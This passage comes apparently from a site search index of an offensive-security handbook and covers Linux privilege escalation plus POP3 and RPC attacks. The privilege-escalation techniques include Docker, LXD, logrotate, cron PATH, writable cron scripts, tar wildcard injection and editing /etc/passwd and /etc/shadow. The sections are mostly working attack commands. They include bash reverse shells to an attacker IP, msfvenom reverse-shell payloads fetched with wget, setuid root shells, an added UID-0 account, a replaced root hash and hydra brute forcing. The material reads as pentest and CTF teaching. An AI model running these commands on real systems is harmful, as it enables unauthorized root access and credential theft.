breaches.</p>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/SUID-SGID-Executables/readme/#understanding-suid-and-sgid","title":"Understanding SUID and SGID","text":"<ol> <li>SUID (Set User ID): When a file with the SUID bit set is executed, it runs with the privileges of the file owner, not the user who launched it. This is often used for programs that need to perform tasks requiring higher privileges than those of the average user.</li> <li>SGID (Set Group ID): When a file with the SGID bit set is executed, it runs with the privileges of the file group. This can be used for allowing members of a group to execute a file with the permissions of the group.</li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/SUID-SGID-Executables/readme/#enumerating-custom-suid-binaries","title":"Enumerating Custom SUID Binaries","text":"<p>we likely won\u2019t find a quick win on GTFOBins for binaries are custom, so we need to understand more about the custom binaries to determine if they can be exploited, checklist that can be followed when enumerating custom SUID binaries:</p> <ol> <li> <p>Interact with the binary \u2013\u00a0Run it with various inputs to understand its functionality and output.</p> </li> <li> <p>Search the binary\u2019s name on GTFOBins to see if there are any quick win exploitation methods.</p> </li> <li> <p>Use <code>strings</code> or <code>--version</code> (if available) to extract version information, Search on Google for known exploits.</p> </li> <li> <p>Extract strings from the binary \u2013 look for shared libraries or binaries being loaded / executed at runtime</p> </li> <li> <p>Debug the program \u2013 deep dive into how the program works some Dangerous Functions: <code>system()</code>, <code>execvp()</code>, <code>strcpy()</code>, <code>sprintf()</code>, <code>gets()</code></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Docker/","title":"Docker","text":""},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Docker/#introduction","title":"Introduction","text":"<p>Docker is a tool designed to create, deploy, and run applications by using containers. Containers allow a developer to package up an application with all parts needed, such as libraries and dependencies.</p>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Docker/#docker-shared-directories","title":"Docker Shared Directories","text":"<p>Shared directories (volume mounts) between the host system and Docker containers can be exploited if improperly configured. If sensitive files are shared with the container, they can be accessed and used for escalation.</p> <ol> <li> <p>Check if the Docker socket is exposed. <code>hackfast@ubuntu:/# ls -l /var/run/docker.sock</code> </p> <p></p> </li> <li> <p>Use the docker image to list all running containers. <code>hackfast@ubuntu:/# docker image ls ps</code> </p> <p></p> </li> <li> <p>Start a new privileged container with access to the host filesystem. <code>hackfast@ubuntu:/# docker -H unix:///var/run/docker.sock run --rm -it --privileged -v /:/host ubuntu chroot /host</code> </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Docker/#docker-group-membership","title":"Docker Group Membership","text":"<p>If a user is a member of the docker group, they can effectively run commands as root because Docker daemon commands have root privileges.</p> <ol> <li> <p>Verify if the current user is in the docker group. <code>hackfast@ubuntu:~$ id</code> </p> <p></p> </li> <li> <p>Use Docker to start a container with access to the host filesystem. <code>hackfast@ubuntu:~$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt /bin/bash</code> </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Docker/#writable-docker-socket","title":"Writable Docker Socket","text":"<p>A writable Docker socket (/var/run/docker.sock) can allow users to run Docker commands as root, leading to full control over the host system.</p> <ol> <li> <p>Verify if the Docker socket is writable. <code>hackfast@ubuntu:~$ ls -l /var/run/docker.sock</code> </p> <p></p> </li> <li> <p>Use the writable Docker socket to start a new container with access to the host filesystem. <code>hackfast@ubuntu:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt /bin/bash</code> </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/LXD/","title":"LXD","text":""},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/LXD/#introduction","title":"Introduction","text":"<p>LXD (Linux Containers Daemon) is a next-generation system container manager, designed to manage Linux containers in a more powerful and flexible way than traditional container technologies like Docker. It provides a user-friendly interface for managing containers and virtual machines, offering capabilities that make it suitable for both development and production environments.</p>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/LXD/#common-scenarios","title":"Common Scenarios","text":"<ol> <li>Host Path Mounting: Gaining access to the host filesystem from within a container.</li> <li>Image Import with Elevated Privileges: Using custom container images configured to grant higher privileges.</li> <li>Misconfigured Container Permissions: Exploiting containers that are started with elevated permissions or insecure settings.</li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/LXD/#exploiting-lxclxd-step-by-step","title":"Exploiting LXC/LXD Step-by-Step","text":"<ol> <li> <p>Check Group Membership, Ensure you are in the <code>lxd</code> group. <code>id</code> </p> <p></p> </li> <li> <p>We have to run lxd first and follow the prompts as seen below <code>lxd init</code> </p> <p></p> </li> <li> <p>Check for the release version, in this scenario I have 18.04 <code>lsb_release -a</code> </p> <p></p> </li> <li> <p>Create the instance &amp; mount it <code>lxc init ubuntu:18.04 test -c security.privileged=true</code> </p> <p></p> <p><code>lxc config device add test whatever disk source=/ path=/mnt/root recursive=true</code> </p> <p></p> </li> <li> <p>Start the instance, and check its running state <code>lxc start test</code> <code>lxc info test</code> </p> <p></p> </li> <li> <p>Now execute bash within the instance <code>lxc exec test bash</code> </p> <p></p> </li> <li> <p>Access the mounted partition /mnt/root <code>cd /mnt/root</code> </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Logrotate/","title":"Logrotate","text":""},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Logrotate/#understanding-logrotate","title":"Understanding Logrotate","text":"<p>Logrotate is a Linux utility designed to manage log files, automating tasks like rotating, compressing, and removing old logs to prevent them from consuming excessive disk space. It's typically scheduled via cron jobs and configured through files like <code>/etc/logrotate.conf</code> and service-specific configurations in <code>/etc/logrotate.d/</code>,When assessing Logrotate for potential exploits, start by identifying configurations that could be exploited:</p> <ul> <li>Writable log files: Check if you have write access to log files managed by Logrotate. If so, this is a strong indicator of potential exploitability.</li> <li>Suid permissions: Investigate whether Logrotate or any associated scripts are running with elevated privileges (e.g., as root). This could allow for privilege escalation.</li> </ul>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Logrotate/#exploiting-logrotate-using-logrotten","title":"Exploiting Logrotate Using Logrotten","text":"<ol> <li> <p>Certain versions of Logrotate are known to be vulnerable To check the version, use the following command: <code>logrotate --version</code> </p> <p></p> <p>NOTE: vulnerable versions: <code>3.8.6</code>, <code>3.11.0</code>, <code>3.15.0</code>, <code>3.18.0</code></p> </li> <li> <p>download Logrotten from the GitHub repository. <code>git clone https://github.com/whotwagner/logrotten.git</code> </p> <p></p> <p>NOTE: Host the script Using Python <code>python -m http.server 80</code></p> </li> <li> <p>download and compiling the Logrotten exploit:</p> <pre><code>wget http://[IP-ADRESS]:80/logrotten.c\ngcc logrotten.c -o logrotten\n</code></pre> <p></p> </li> <li> <p>Create a payload that Logrotate will execute. A common example is a bash reverse shell: <code>echo 'bash -i &gt;&amp; /dev/tcp/[IP-ADRESS]/9001 0&gt;&amp;1' &gt; payload</code></p> </li> <li> <p>Set up a listener on your attacking machine, to catch the reverse shell: <code>nc -nlvp 9001</code></p> </li> <li> <p>Execute the exploit with the prepared payload: <code>./logrotten -p ./payload /home/backups/access.log</code> NOTE: Once Logrotate processes the payload, you should receive a shell.</p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Cron-Jobs/Exploiting-Cron-PATH/","title":"Exploiting Cron PATH","text":""},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Cron-Jobs/Exploiting-Cron-PATH/#path-environment-variable","title":"PATH Environment Variable","text":"<p>In crontab, the default PATH environment variable is set to /usr/bin:/bin. However, this PATH can be overwritten within the crontab file. If a cron job script or program does not use an absolute path, and one of the directories in the PATH is writable by our user, we may be able to create a script or program with the same name as the cron job,This vulnerability allows us to run our own program/script instead of the intended cron job script, which could be exploited for various purposes.</p>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Cron-Jobs/Exploiting-Cron-PATH/#steps-to-identify-and-exploit-path-environment-variable","title":"Steps to Identify and Exploit PATH Environment Variable","text":"<ol> <li> <p>Run LinPEAS to detect potential vulnerabilities, such as issues in the cron PATH.  </p> <p> </p> </li> <li> <p>We can Find where the overwrite.sh script is located using the find command: <code>find / -iname overwrite.sh 2&gt;/dev/null</code> </p> <p> </p> NOTE <p>This indicates that overwrite.sh executes from the /usr/local/bin directory.</p> </li> <li> <p>Confirm that we have write permissions on the target directory: <code>ls -la /home | grep \"user\"</code> </p> <p> </p> NOTE <p>Here we see \u201cw\u201d, which means that we can write in this directory.</p> </li> <li> <p>To exploit this cron job, all we have to\u00a0 craft a malicious payload named \u201coverwrite.sh\u201d and drop it in the /home/user/ folder. <code>echo -e '#!/bin/bash\\n\\ncp /bin/bash /tmp/rootme\\nchmod +xs /tmp/rootme' &gt; /home/user/overwrite.sh</code></p> </li> <li> <p>In order for the cron job to execute our binary, Ensure the malicious script has execute permissions: <code>chmod 755 /home/user/overwrite.sh</code> </p> <p> </p> </li> <li> <p>Once the cron job has created and setuid rootbash, use it to open a shell with root privileges: <code>/tmp/rootme -p</code> </p> <p> </p> </li> <li> <p>Alternatively, use msfvenom to create a reverse shell payload: <code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.11.92.52 LPORT=1337 -a x64 -f elf -o overwrite.sh</code> </p> <p> </p> </li> <li> <p>Now that our payload has been created, we can download it onto the target machine (check out FIle Transfer Section) <code>wget http://[IP-ADRESS]:8000/overwrite.sh -O /home/user/overwrite.sh</code> </p> <p> </p> </li> <li> <p>it is still not ready. In order for the cron job to execute our binary, we need to give is execute permissions. <code>chmod 755 ./overwrite.sh</code> </p> <p> </p> </li> <li> <p>The payload is ready and should trigger every minute. All that is left to do is start a netcat listener on out attacker machine <code>nc -lvnp 1337</code> </p> <p> </p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Cron-Jobs/Exploiting-Weak-File-Permissions/","title":"Exploiting Weak File Permissions","text":""},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Cron-Jobs/Exploiting-Weak-File-Permissions/#introduction","title":"Introduction","text":"<p>Misconfiguration of file permissions associated with cron jobs can lead to easy privilege escalation. If we can write to a program or script that is executed as part of a cron job, we can replace it with our own code. This allows us to run arbitrary code with the privileges of the user executing the cron job, potentially gaining unauthorized access and control over the system.</p>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Cron-Jobs/Exploiting-Weak-File-Permissions/#steps-to-identify-and-exploit-weak-file-permission","title":"Steps to Identify and Exploit Weak File Permission","text":"<ol> <li> <p>By executing LinPEAS, we discover a cron job that runs every minute as root, marked with a red/yellow alert.  </p> <p></p> NOTE <p>Even without this being a red/yellow finding, it is worth a closer look!</p> </li> <li> <p>Check the permissions of the script executed by the cron job: <code>ls -la /home/karen/backup.sh</code> </p> <p></p> NOTE <p>Here we see \u201crw\u201d, \u00a0This means that we can either replace this file with a malicious one or edit it so that it executes a malicious command for us. </p> </li> <li> <p>Next, we should Inspect the script to understand its functionality and decide whether to edit or replace it: <code>cat /home/karen/backup.sh</code> </p> <p></p> </li> <li> <p>Add the following command to the script that will give us a reverse shell: <code>echo '#!/bin/bash' &gt; /home/karen/backup.sh</code> <code>echo \"\" &gt;&gt; /home/karen/backup.sh</code> <code>echo 'bash -i &gt;&amp; /dev/tcp/[IP-ADRESS]/1338 0&gt;&amp;1' &gt;&gt; /home/karen/backup.sh</code> </p> <p> </p> NOTE <p>In order for the cron job to execute our binary, don't forget give it execute permissions  </p> <p><code>chmod +x /home/karen/backup.sh</code> </p> </li> <li> <p>Run a netcat listener on your local machine and wait for the cron job to run. A reverse shell running as the root user should be caught: <code>nc -lvnp 1338</code> </p> <p></p> <p>In order for the cron job to execute our binary, don't forget give it execute permissions <code>chmod +x /home/karen/backup.sh</code></p> NOTE <p>Within a minute, the cron job should trigger, and you should obtain a root shell. </p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Cron-Jobs/Hunting-Cron-Jobs/","title":"Hunting Cron Jobs","text":""},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Cron-Jobs/Hunting-Cron-Jobs/#enumerating-cron-jobs-using-linpeas","title":"Enumerating Cron Jobs Using LinPEAS","text":"<ol> <li> <p>Set up an HTTP server on your attacker machine in the directory where <code>linpeas.sh</code> is located: <code>python3 -m http.server 80</code> </p> <p></p> </li> <li> <p>Use the following command on the target machine to download LinPEAS: <code>wget http://[IP-ADRESS]:8000/linpeas.sh</code></p> <p></p> </li> <li> <p>Run LinPEAS to enumerate system cron jobs:  </p> <p> </p> NOTE <p>LinPEAS enumerates the cron jobs and displays the same information found manually.</p> <p></p> NOTE <p>Red/Yellow in LinPEAS indicates a 95% chance that the finding can be exploited for privilege escalation</p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Cron-Jobs/Hunting-Cron-Jobs/#enumerating-system-cron-jobs-manually","title":"Enumerating System Cron Jobs Manually","text":"<ol> <li> <p>The first place to check for cron jobs is in the system crontab file: <code>cat /etc/crontab</code> </p> <p></p> </li> </ol> <p>Here we can see that two cron jobs are running on this host:</p> <ol> <li> <p>The first cron job runs every minute, executing the <code>overwrite.sh</code> script.</p> </li> <li> <p>The second cron job runs every minute, executing the <code>/usr/local/bin/compress.sh</code> script.</p> </li> <li> <p>If no cron jobs are found in the crontab file, or if these ones cannot be exploited, check for custom jobs in all of the cron directories: <code>ls -l /etc/cron*</code> </p> <p></p> NOTE <p>All five additional directories where cron jobs can execute from are shown. No custom cron jobs were found; these are all standard jobs commonly found by default</p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Cron-Jobs/Hunting-Cron-Jobs/#enumerating-user-cron-jobs-manually","title":"Enumerating User Cron Jobs Manually","text":"<ol> <li> <p>After enumerating all the system crontabs, check for user cron jobs (hidden cron jobs): <code>ls -l /var/spool/cron/crontabs</code> </p> <p></p> NOTE <p>Standard users cannot access the directory where user cron jobs are stored.</p> </li> <li> <p>And when we check the /var/spool/cron folder permissions, we can see why. <code>ls -l /var/spool/cron | grep \"crontabs\"</code> </p> <p> </p> NOTE <p>The 'T' sticky bit is a permission bit set on a directory that allows only the owner or the root user to delete or rename the files within it.</p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Cron-Jobs/Readme/","title":"README","text":""},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Cron-Jobs/Readme/#introduction","title":"Introduction","text":"<p>Cron jobs are programs or scripts that users can schedule to run at specific times or intervals. These tasks are managed by the cron daemon, a background process that executes scheduled commands on Unix-like operating systems. Cron jobs run with the security level of the user who owns them, ensuring that they have the same permissions as the user. This means that a cron job created by a regular user will execute with that user's permissions, while a cron job created by the root user will have root-level privileges.</p> NOTE <p>While CTF machines can have cron jobs running every minute or every 5 minutes, you will more often see tasks that run daily, weekly or monthly in penetration test engagements.</p>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Cron-Jobs/Readme/#there-are-two-types-of-crontabs-that-can-be-used-to-run-cron-jobs","title":"There Are Two Types of Crontabs That Can Be Used to Run Cron Jobs","text":"<ol> <li>The system crontab: Used it to schedule system-wide jobs, The default system crontab configuration file is located at /etc/crontab</li> <li>The user crontab This file lets users create and edit cron jobs that only apply at the user level \u2013 Created using the crontab -e command and stored in /var/spool/cron/crontabs</li> <li>crontabs created with crontab -e commands are only visible to the users who create them. They cannot be enumerated in a standard way, which is why they are considered \u201chidden cron jobs\u201d. Standard users cannot even access the directory where they are stored. The the only way a standard user can view their crontab is by using the crontab command.</li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Cron-Jobs/Readme/#cron-directories","title":"Cron Directories","text":"<p>cron jobs can be added to the etc/cron.d directory. However, this is bad practice because cron.d is mainly intended for automatic installations and updates,\u00a0root user can also move their scripts into the following directories to schedule their execution (also bad practice):</p> <ol> <li>Run all scripts once an hour <code>/etc/cron.hourly/</code></li> <li>Run once a day. <code>/etc/cron.daily/</code></li> <li>Run once a week. <code>/etc/cron.weekly/</code></li> <li>Run once a month. <code>/etc/cron.monthly/</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Cron-Jobs/Wildcard-Injection/","title":"Wildcard Injection","text":""},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Cron-Jobs/Wildcard-Injection/#introduction","title":"Introduction","text":"<p>When you use a wildcard character (*) in a command argument, the shell performs a process called filename expansion or globbing. This replaces the wildcard with a space-separated list of all file and directory names in the current directory. You can observe this behavior by executing the command echo * from your home directory.</p>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Cron-Jobs/Wildcard-Injection/#wildcards-filenames","title":"Wildcards &amp; Filenames","text":"<p>Linux filesystems allow a wide range of characters in filenames. Because filename expansion occurs before command execution, you can inadvertently pass command-line options (like -h or --help) by creating files with these names. Here\u2019s an example to illustrate this:</p> <pre><code>$ ls *\n$ touch ./-l\n$ ls *\n</code></pre> <p>Filenames aren't limited to simple options like -h or --help. You can also create filenames that correspond to more complex options, such as --option=key=value. Tools like GTFOBins can help you find commands with useful command-line options for such purposes.</p>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Cron-Jobs/Wildcard-Injection/#steps-to-identify-and-exploit-wildcard-vulnerabilities","title":"Steps to Identify and Exploit Wildcard Vulnerabilities","text":"<ol> <li> <p>By Running LinPEAS reveals a cron job running every minute as root, executing a script in /usr/local/bin using the absolute path.  </p> <p></p> <p>NOTE: Even without this being a red/yellow finding, it is worth a closer look!</p> </li> <li> <p>Check the permissions on the /usr/local/bin/ directory to determine if we can write to it: <code>ls -l /usr/local | grep \"bin\"</code> </p> <p></p> <p>NOTE: The bin directory is owned by root and the staff group. Our user has only read and execute permissions.</p> </li> <li> <p>However, Despite not having write permissions, we can still exploit this cron job by examining the script: <code>ls -la /usr/local/bin/compress.sh</code></p> <p></p> <p>NOTE: I guess that means we won\u2019t be able to exploit this cron job since we don't write have permissions to compress.sh script</p> </li> <li> <p>Actually \u2013 not true at all! We definitely still can exploit this cron job! <code>cat /usr/local/bin/compress.sh</code> </p> <p></p> <p>NOTE: When a wildcard character (*) is provided to a command as part of an argument, the shell will first perform filename expansion (also known as globbing) on the wildcard.</p> </li> <li> <p>The tar command is run with a wildcard in the /home/user directory. <code>ls -l /home | grep \"user\"</code> </p> <p></p> <p>NOTE: This confirms that our current user does have write permissions in the /home/user directory!</p> </li> <li> <p>GTFOBins shows that tar has command line options which can be used to run other commands as part of a checkpoint feature.  </p> <p></p> </li> <li> <p>we can use msfvenom to craft a reverse shell ELF payload <code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=[IP-ADRESS] LPORT=1337 -f elf -o shell.elf</code> </p> <p></p> <p>NOTE: we can create files that are named different switches, and tar will execute them when it compresses everything in the directory.</p> </li> <li> <p>Now that our payload has been created, we can download it onto the target machine (check out FIle Transfer Section) <code>wget http://[IP-ADRESS]:8000/shell.elf -O /home/user/shell.elf</code> </p> <p></p> </li> <li> <p>it is still not ready. In order for the cron job to execute our binary, we need to give is execute permissions. <code>chmod +x /home/user/shell.elf</code></p> </li> <li> <p>Lets Create two files in the /home/user directory: <code>touch /home/user/--checkpoint=1 &amp;&amp; touch /home/user/--checkpoint-action=exec=shell.elf</code> </p> <p></p> </li> <li> <p>The payload is ready and should trigger every minute. All that is left to do is start a netcat listener on out attacker machine <code>nc -lvnp 1337</code> </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Weak-File-Permissions/File-Permissions/","title":"File Permissions","text":""},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Weak-File-Permissions/File-Permissions/#file-permissions-in-linux","title":"File Permissions in Linux","text":"<p>The concept of permissions and ownership is crucial in Linux. On a Linux system, each file and directory is assigned access rights for the owner of the file, the members of a group of related users, and everybody else.</p>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Weak-File-Permissions/File-Permissions/#ownership-types","title":"Ownership Types","text":"<ul> <li>Owner: The Owner permissions apply only to the owner of the file or directory.</li> <li>Group: The Group permissions apply only to the group that has been assigned to the file or directory.</li> <li> <p>Other Users: The other users\u2019 permissions apply to all other users on the system that are not the owner, nor part of the group. </p> <p></p> </li> </ul>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Weak-File-Permissions/File-Permissions/#directory-permissions-in-linux","title":"Directory Permissions in Linux","text":"Permissions Numeric Code Description <code>----------</code> <code>0000</code> No permissions <code>-rwx------</code> <code>0700</code> Read, write, &amp; execute only for owner <code>-rwxrwx---</code> <code>0770</code> Read, write, &amp; execute for owner and group <code>-rwxrwxrwx</code> <code>0777</code> Read, write, &amp; execute for owner, group, and others <code>---x--x--x</code> <code>0111</code> Execute only <code>--w--w--w-</code> <code>0222</code> Write only <code>--wx-wx-wx</code> <code>0333</code> Write &amp; execute <code>-r--r--r--</code> <code>0444</code> Read only <code>-r-xr-xr-x</code> <code>0555</code> Read &amp; execute <code>-rw-rw-rw-</code> <code>0666</code> Read &amp; write <code>-rwxr-----</code> <code>0740</code> Owner can read, write, &amp; execute; group can only read; others have no permissions"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Weak-File-Permissions/etc-passwd/","title":"/etc/passwd","text":""},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Weak-File-Permissions/etc-passwd/#overview-of-etcpasswd-vulnerabilities","title":"Overview of /etc/passwd Vulnerabilities","text":"<p>The <code>/etc/passwd</code> file is crucial in Linux systems as it stores essential information about user accounts. It is readable by all users on the system but should only be writable by the root user. Any misconfiguration in its permissions can lead to severe security risks.</p>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Weak-File-Permissions/etc-passwd/#step-1-modifying-etcpasswd-to-change-root-password","title":"Step 1: Modifying /etc/passwd to Change Root Password","text":"<p>If <code>/etc/passwd</code> is writable, attacker can modify the password hash of the root user to a known value, enabling unauthorized root access. This is feasible if the system uses legacy behavior where <code>/etc/passwd</code> can contain password hashes.</p> <ol> <li> <p>Confirm if /etc/passwd is writable. <code>ls -l /etc/passwd</code> </p> <p></p> </li> <li> <p>Use OpenSSL to generate a new password hash with a password of your choice:. <code>openssl passwd -1 \"hackfast\"</code> </p> <p></p> </li> <li> <p>Replace the root user password hash. <code>nano /etc/passwd</code> </p> <p></p> </li> <li> <p>Use the new password to switch to the root user. <code>su</code> </p> <p></p> </li> <li> <p>Alternatively, log in with SSH: <code>ssh root@[IP-ADRESS]</code></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Weak-File-Permissions/etc-passwd/#step-2-adding-a-new-root-account","title":"Step 2: Adding a New Root Account","text":"<p>If appending is possible but not modification, you can add a new user with root privileges by assigning them the root user ID (UID 0).</p> <ol> <li> <p>Add a new entry with UID 0 and your known password hash. <code>echo 'newroot:[hash]:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd</code></p> </li> <li> <p>Log in as the new user without needing root actual password. <code>su newroot</code></p> </li> <li> <p>Alternatively, log in with SSH: <code>ssh newroot@[IP-ADRESS]</code></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Weak-File-Permissions/etc-shadow/","title":"/etc/shadow","text":""},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Weak-File-Permissions/etc-shadow/#overview-of-etcshadow-vulnerabilities","title":"Overview of /etc/shadow Vulnerabilities","text":"<p>The /etc/shadow file that stores password hashes that are only accessible by the root user under normal circumstances. Misconfigurations in this file's permissions can lead to severe security breaches.</p> <p>Practice Machine : https://tryhackme.com/r/room/linuxprivescarena</p>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Weak-File-Permissions/etc-shadow/#scenario-1-cracking-password-hashes","title":"Scenario 1: Cracking Password Hashes","text":"<p>If /etc/shadow is readable due to misconfigured permissions, attacker can extract and crack password hashes.</p> <ol> <li> <p>Verify if the /etc/shadow is readable. <code>ls -l /etc/shadow</code> </p> <p></p> </li> <li> <p>Using LinPEAS.sh you can also find\u00a0 about this vulnerability being present. <code>./linpeas.sh</code> </p> <p></p> </li> <li> <p>Having the ability to read /etc/shadow, we can copy the contents of it, and then, crack the hashes using john <code>cat /etc/shadow</code> </p> <p></p> </li> <li> <p>Copy the contents of it into your own machine, or use any type of file transfer method you prefer. <code>echo 'HASH' &gt; shadow.hash</code></p> </li> <li> <p>Use a password cracker like John the Ripper. <code>john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt shadow.hash</code></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Privilege-Escalation/Weak-File-Permissions/etc-shadow/#scenario-2-replacing-the-root-password-hash","title":"Scenario 2: Replacing the Root Password Hash","text":"<p>If /etc/shadow is writable, an attacker can replace the root password hash with a known one.</p> <ol> <li> <p>Ensure the file is incorrectly writable. <code>ls -l /etc/shadow</code></p> </li> <li> <p>Generate a new hash for a known password. <code>mkpasswd -m sha-512 newpassword</code> </p> <p></p> </li> <li> <p>Create a backup of the /etc/shadow file  </p> <p></p> </li> <li> <p>Copy the output hash, and, replace the root hash with our new hash <code>Before</code> </p> <p></p> <p><code>After</code> </p> <p></p> </li> <li> <p>You can use sed command to create a whole new line <code>sed 's/^root:[^:]*:/root:[HASH]:/g' /etc/shadow | grep [USER]</code> </p> <p></p> <p><code>sed 's/^root:[^:]*:/root:$6$kIW2RPXnEttDUn1y$7VCgKvZGaJhS06zJZfWbcGbybqDaynTQMnpZjFjrFcLy9KJ\\/97pxQXM5ASSssIUV\\/Vydx8QSWJkUPH0tvqoVH\\/:/g' /etc/shadow | grep root</code></p> </li> <li> <p>Now we can log in as root <code>ssh root@[IP-ADRESS]</code> </p> <p></p> </li> </ol>"},{"location":"Offensive-Security/Network/ports/110/","title":"110 - POP3","text":""},{"location":"Offensive-Security/Network/ports/110/#pop3-basics","title":"POP3 BASICS","text":"<ol> <li>Purpose: An application layer protocol used for retrieving email messages from a mail server.</li> <li>Port: Operates on TCP port 110.</li> <li>Model: Follows a client-server model, where the client connects to the mail server to retrieve emails.</li> </ol>"},{"location":"Offensive-Security/Network/ports/110/#pop3-commands","title":"POP3 COMMANDS","text":"<ol> <li>USER: Identifies the username or email address of the client.</li> <li>PASS: Provides the password for authentication.</li> <li>LIST: Retrieves a list of all emails on the server, along with their sizes.</li> <li>RETR: Retrieves a specific email from the server based on its index.</li> <li>DELE: Marks a specific email for deletion on the server.</li> <li>NOOP: No operation command, used to keep the connection alive.</li> <li>QUIT: Terminates the POP3 session and closes the connection.</li> </ol>"},{"location":"Offensive-Security/Network/ports/110/#brute-forcing-pop3-credentials","title":"BRUTE-FORCING POP3 CREDENTIALS","text":"<ol> <li>Unknown User     <code>hydra -L user.txt -p \"Password\" -f [TARGET-IP] pop3</code></li> <li>Unknown Password     <code>hydra -l user -P /opt/rockyou.txt -f [TARGET-IP] pop3</code></li> <li>Unknown User and Password     <code>hydra -L user.txt -P /opt/rockyou.txt -f [TARGET-IP] pop3</code></li> <li>Different Port     <code>hydra -l user -P /opt/rockyou.txt -f [TARGET-IP] pop3 -s 9999</code></li> </ol>"},{"location":"Offensive-Security/Network/ports/110/#pop3-responses","title":"POP3 RESPONSES","text":"<ol> <li>+OK: Indicates a successful response from the server.</li> <li>-ERR: Indicates an error response from the server.</li> </ol>"},{"location":"Offensive-Security/Network/ports/110/#example","title":"EXAMPLE","text":"<pre><code>hackfast@kali:~$ telnet [IP-ADRESS] 110\n +OK alpha POP3 service (JAMES POP3 Server 2.3.2) active\n USER mrrobot\n +OK\n PASS secretpassword\n +OK Welcome mrrobot\n\n list\n\n +OK 2 1807\n 1 786\n 2 1021\n\n retr 1\n\n +OK Retrieving message\n From: mrrobot@hackfa.st\n Hello Mr. Robot,\n\n Below is your remote desktop login info. Please remember it!\n username: mrrobot\n password: S3cur3P@ssw0rd\n</code></pre>"},{"location":"Offensive-Security/Network/ports/135/","title":"111/135 - RPC","text":""},{"location":"Offensive-Security/Network/ports/135/#introduction","title":"Introduction","text":"<p>RPC (Remote Procedure Call) is a protocol that enables a program to execute procedures on a remote system as if they were local. It abstracts the complexities of network communication, making it essential for building distributed applications. RPC allows seamless interaction between client and server components, handling the network communication and data exchange behind the scenes.</p>"},{"location":"Offensive-Security/Network/ports/135/#rpc-server-exploration","title":"RPC Server Exploration","text":"<pre><code># Connect to RPC server using rpcclient on port 135/TCP with null (anonymous) authentication\nrpcclient -U \"\" -N [TARGET-IP] \nrpcclient -U \"[USERNAME]\" [TARGET-IP] # With creds \n\n# Extract information about the display settings of the server\nquerydispinfo  \n\n# lists all users in the domain cop\nrpcclient -U \"\" -N [TARGET-IP] -c \"enumdomusers\" &gt; output.txt\n\n# Extract user names from 'output.txt'\ncat output.txt | awk -F\\[ '{print $2}' | awk -F\\] '{print $1}' &gt; users.lst\n\n\n#Brute Forcing User RIDs\nfor i in $(seq 500 1100);do rpcclient -N -U \"\" [TARGET-IP] -c \"queryuser 0x$(printf '%x\\n' $i)\" | grep \"User Name\\|user_rid\\|group_rid\" &amp;&amp; echo \"\";done\n</code></pre>"},{"location":"Offensive-Security/Network/ports/1433/","title":"1433/1434 - MSSQL","text":""},{"location":"Offensive-Security/Network/ports/1433/#introduction","title":"Introduction","text":"<p>Microsoft SQL Server (MSSQL) is a relational database management system developed by Microsoft. It is 